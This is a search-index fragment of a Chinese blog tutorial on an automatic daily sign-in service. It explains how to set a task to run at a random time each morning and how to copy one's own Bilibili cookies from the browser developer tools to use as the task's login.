\u5982\u679c\u4f60\u6bd4\u8f83\u5728\u610f\u8fd9\u4e2a\uff0c\u6216\u8005\u662f\u8ddf\u6211\u4e00\u6837\u6709\u5f3a\u8feb\u503e\u5411\uff08\u4f8b\u5982\u60f3\u8981\u7edf\u4e00\u5728\u65e9\u4e0a\u7b7e\u5230\uff09\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91\u4efb\u52a1\u7684\u5b9a\u65f6\u6765\u5b9e\u73b0\u3002 \u4ee5\u4e0b\u662f\u4e00\u4e2a\u793a\u4f8b\uff0c\u6211\u5c06\u4f1a\u628a\u521a\u521a\u6dfb\u52a0\u7684\u90a3\u4e2a\u4efb\u52a1\u7684\u5b9a\u65f6\u4fee\u6539\u6210\u5728 \u6bcf\u5929\u65e9\u4e0a 6:00 ~ 9:00 \u8fdb\u884c\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u4fee\u6539\u3002 \u9996\u5148\u70b9\u51fb\u4efb\u52a1\u672b\u5c3e\u7684 \u5b9a\u65f6 \u6309\u94ae\u3002 \u6b64\u65f6\u4f1a\u51fa\u73b0\u4e00\u4e2a\u5b9a\u65f6\u754c\u9762\u4fee\u6539\u6846\u3002 \u7136\u540e\u6211\u4eec\u628a \u5b9a\u65f6\u5f00\u5173 \u548c \u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4 \u8fd9\u4e24\u4e2a\u52fe\u7ed9\u52fe\u4e0a\uff0c\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u800c\u4e0d\u662f\u6bcf\u6b21\u5411\u540e\u987a\u5ef624\u5c0f\u65f6\u3002 \u5b9a\u65f6\u5f00\u5173\uff1a \u5f00\uff1a\u6bcf\u5929\u56fa\u5b9a\u65f6\u95f4\u7b7e\u5230 \u5173\uff1a\u4e0a\u4e00\u6b21\u7b7e\u5230\u6210\u529f\u7684\u65f6\u95f4\u987a\u5ef624\u4e2a\u5c0f\u65f6 \u5f53\u5929\u968f\u673a\u5ef6\u65f6\u533a\u95f4\uff1a \u5f00\uff1a\u6bcf\u6b21\u968f\u673a\u5411\u540e\u5ef6\u65f6 \u5173\uff1a\u4e0d\u968f\u673a\u5ef6\u65f6\uff0c\u771f\u6b63\u7684\u56fa\u5b9a\u65f6\u95f4 \u6211\u505a\u6f14\u793a\u7684\u65f6\u5019\uff0c\u5f53\u5929\u662f 2022\u5e746\u67085\u65e5 \uff0c\u6240\u4ee5\u8fd9\u91cc\u9ed8\u8ba4\u663e\u793a\u7684\u65e5\u671f\u4e5f\u662f 2022\u5e746\u67085\u65e5 \u3002\u56e0\u4e3a\u6211\u4eec\u4eca\u5929\u5df2\u7ecf\u7b7e\u5230\u8fc7\u4e00\u6b21\u4e86\uff0c\u5e0c\u671b\u4ed6\u4ece\u660e\u5929\u5f00\u59cb\uff0c\u6240\u4ee5\u628a\u8fd9\u4e2a\u65e5\u671f\u6539\u6210 2022\u5e746\u67086\u65e5 \u3002 \u56e0\u4e3a\u6211\u4eec\u9700\u8981\u5728\u6bcf\u5929\u65e9\u4e0a\u7684 6:00 ~ 9:00 \u4e4b\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u65f6\u95f4\u8fdb\u884c\u7b7e\u5230\uff0c\u6240\u4ee5\u628a\u540e\u9762\u7684\u65f6\u95f4\u6539\u4e3a 06:00:00 \uff0c\u5ef6\u65f6\u533a\u95f4\u6539\u4e3a 0~10800 \uff08\u4e5f\u5c31\u662f3\u4e2a\u5c0f\u65f6\uff09\u3002 \u6700\u540e\u6211\u4eec\u6539\u5b8c\u662f\u8fd9\u6837\u7684\uff1a \u70b9\u51fb \u63d0\u4ea4 \u5373\u53ef\u3002 \u5237\u65b0\u4e00\u4e0b\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u4efb\u52a1\u7684\u65f6\u95f4\u5df2\u7ecf\u53d8\u6210\u4e86\u65e9\u4e0a6\u70b9\u52309\u70b9\u4e2d\u95f4\u7684\u4e00\u4e2a\u968f\u673a\u503c\u3002","title":"\u4e94\u3001\u4fee\u6539\u4efb\u52a1\u5b9a\u65f6"},{"location":"blog/2022/220530-auto-sign-in-guide/#cookies","text":"\u6709\u5f88\u591a\u7c7b\u4f3c\u4e8e\u8fd9\u6837\u5b50\u7684\u6a21\u677f\uff0c\u5b83\u8981\u6c42\u63d0\u4f9b Cookies\uff0c\u800c\u4e0d\u662f\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u4e0b\u9762\u5c06\u4ee5 https://www.bilibili.com/ \u4e3a\u4f8b\uff0c\u5c55\u793a\u5982\u4f55\u83b7\u53d6\u9996\u9875 Cookies\u3002 \u9996\u5148\u8fdb\u5165 B \u7ad9\u9996\u9875\uff0c\u6309\u4e0b F12 \u5f00\u542f\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u63a7\u5236\u53f0\u3002\u5207\u6362\u5230 \u7f51\u7edc \u9009\u9879\u5361\uff08\u6216\u8005 Network \u9009\u9879\u5361\uff09\u3002 \u6309\u4e0b F5 \u5237\u65b0\u9875\u9762\uff0c\u6b64\u65f6\u8fd9\u91cc\u5e94\u8be5\u4f1a\u51fa\u73b0\u5f88\u591a\u8bf7\u6c42\u3002\u9009\u62e9\u7b2c\u4e00\u4e2a\uff0c\u67e5\u770b\u5b83\u7684\u8bf7\u6c42\u5934\uff0c\u627e\u5230 Cookies\u3002 \u590d\u5236 Cookies \u5373\u53ef\uff08\u6ce8\u610f\u662f\u590d\u5236 Cookies \u7684\u5185\u5bb9\uff0c\u4e0d\u8981\u628a Cookie \u8fd9\u51e0\u4e2a\u5b57\u6bcd\u4e5f\u590d\u5236\u8fc7\u53bb\u4e86\uff09","title":"\u516d\u3001\u5982\u4f55\u521b\u5efa\u4ee5 Cookies \u4f5c\u4e3a\u767b\u9646\u65b9\u5f0f\u7684\u7b7e\u5230\u4efb\u52a1"}]}